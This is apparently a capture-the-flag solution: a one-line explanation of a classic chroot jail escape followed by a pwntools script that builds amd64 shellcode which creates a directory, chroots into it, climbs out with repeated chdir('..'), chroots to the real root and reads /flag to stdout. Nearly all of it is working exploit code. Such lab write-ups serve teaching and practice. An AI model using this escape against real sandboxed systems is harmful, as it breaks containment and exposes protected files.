chroot again and chdir("..") many times, then chroot(".") to change the value of '/' of the process.    
```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.mkdir('foo')
shellcode+=shellcraft.chroot('foo')
shellcode+=shellcraft.chdir('..')
shellcode+=shellcraft.chdir('..')
shellcode+=shellcraft.chdir('..')
shellcode+=shellcraft.chdir('..')
shellcode+=shellcraft.chroot('.')
shellcode+=shellcraft.open("/flag")
shellcode+=shellcraft.read(4, 0x13373e8, 0x100)
shellcode+=shellcraft.write(1, 0x13373e8, 0x100)
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
